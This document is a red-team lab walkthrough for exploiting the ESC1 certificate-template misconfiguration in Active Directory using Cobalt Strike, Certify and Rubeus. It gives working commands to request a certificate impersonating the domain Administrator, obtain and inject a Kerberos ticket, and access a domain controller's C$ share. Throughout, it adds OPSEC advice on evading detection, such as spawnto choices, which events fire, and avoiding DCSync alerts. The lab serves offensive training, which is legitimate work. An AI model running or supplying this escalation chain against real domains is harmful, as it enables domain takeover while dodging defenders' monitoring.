# ESC1 Misconfigured Client Authentication Templates

>The objective of this lab is to identify and exploit ESC1.

===

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the medium-integrity Beacon.
3. Enumerate the certificate authority for vulnerable templates.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
    ```

    > **OPSEC-CAUTION** — `execute-assembly` uses fork & run; spawns a sacrificial process (default: `rundll32.exe` unless overridden by `spawnto`). Generates Event 4688 (process creation) if process auditing is enabled. Ensure `spawnto` is set to a less-signatured binary in your Malleable C2 profile (e.g. `dllhost.exe`).
    >
    > ADCS enumeration via Certify sends LDAP queries to the domain controller — Event 1644 (LDAP query) may appear in DC logs under verbose LDAP auditing, but this is rarely monitored.
    >
    > **Stealthier alternative:** Use `Certutil.exe -TCAInfo` for basic CA enumeration (LOLBin, no assembly spawn), or `ldapsearch` via BOF to query `CN=Certificate Templates` directly without spawning a process.

⚠️ This should reveal a template called *ESC1*.

4. Request a certificate, specifying the default domain Administrator's *UserPrincipalName* in the certificate's Subject Alternative Name (SAN).

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
    ```

    > **OPSEC-CAUTION** — `execute-assembly` again spawns a sacrificial process. The certificate request itself generates **Event 4886** (Certificate Services received a certificate request) and **Event 4887** (approved and issued) on the CA server — these are always logged on the CA and cannot be suppressed. The cert is returned over the C2 channel and never touches disk unless you write it manually.
    >
    > **Stealthier alternative:** [Certipy](https://github.com/ly4k/Certipy) (from Linux) can request the cert out-of-band via RPC/HTTP if you have network access to the CA, keeping the action entirely off the target beacon. In-lab, `execute-assembly` is the required path.

5. Use Rubeus to request a TGT for Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
    ```

    > **OPSEC-CAUTION** — `execute-assembly` spawns sacrificial process. The AS-REQ to the KDC generates **Event 4768** (Kerberos TGT request) on the DC — normal Kerberos traffic, but the certificate-based pre-authentication (PKINIT) can stand out in environments with baseline monitoring. Using `/enctype:aes256` is preferred over RC4 (less signatured).
    >
    > The `/nowrap` flag returns the base64 ticket for capture — ticket is **not** injected yet. Proceed to step 6 to use it.
    >
    > **Stealthier alternative:** Add `/ptt` to the Rubeus command to inject and use immediately in one step, avoiding a second `execute-assembly` call. Only do this if you plan to use the ticket immediately — injected tickets are visible to EDR memory scanners.

⚠️ In this lab, you have learned how to identify and exploit ESC1 to gain domain admin privileges.

---

## Proving Domain Admin Access with the TGT (OPSEC-Safe)

After obtaining the Administrator TGT, prove DA-level access without lateral movement noise.

### Step 1 — Inject the ticket into the beacon session

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TICKET]
```

> **OPSEC-SAFE** — Ticket is injected into the current beacon's logon session in-memory only. No process spawn beyond the sacrificial `execute-assembly` host process. No disk writes. No network traffic at injection time.

### Step 2 — List the DC C$ share

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-SAFE** — `ls` in CS uses the beacon's existing token/ticket context over SMB. Generates a **Type 3 network logon (Event 4624)** on the DC — indistinguishable from normal admin access. No service creation, no new process on the remote host, no lateral movement artifact. Accessing `C$` requires Domain Admin or local admin on the DC — a successful listing proves DA-level access conclusively.

### Step 3 — Read a sensitive file (flag or proof)

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-SAFE** — `download` pulls the file over the beacon's existing C2 channel. No additional process spawned on the remote host. Generates **Event 4663** (file access) on the DC if Object Access auditing is enabled — uncommon in default Windows Server configs but possible in hardened environments.
>
> **Why this over DCSync?** `dcsync` generates a **replication event (Event 4662)** on the DC that security tools like MDI (Microsoft Defender for Identity) specifically alert on. File access via ticket is significantly quieter for proof purposes. Use DCSync only when you need credential material (krbtgt hash), not just to demonstrate access.

### Alternative — Verify ticket and session without network noise

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **OPSEC-SAFE** — Lists tickets in the current logon session. Confirms the Administrator TGT is present and valid before using it. No network traffic, no remote host contact.

### OPSEC Summary for Post-ESC1 Exploitation

| Action | Command | OPSEC | Event Generated |
|--------|---------|-------|-----------------|
| Inject ticket | `Rubeus ptt` | SAFE | None (local only) |
| Verify ticket | `Rubeus klist` | SAFE | None |
| Prove DA (share access) | `ls \\dc\C$` | SAFE | 4624 (Type 3) on DC |
| Read flag file | `download \\dc\C$\...\root.txt` | SAFE | 4663 on DC (if audited) |
| Dump all creds | `dcsync DOMAIN\krbtgt` | CAUTION | 4662 on DC — MDI alert |
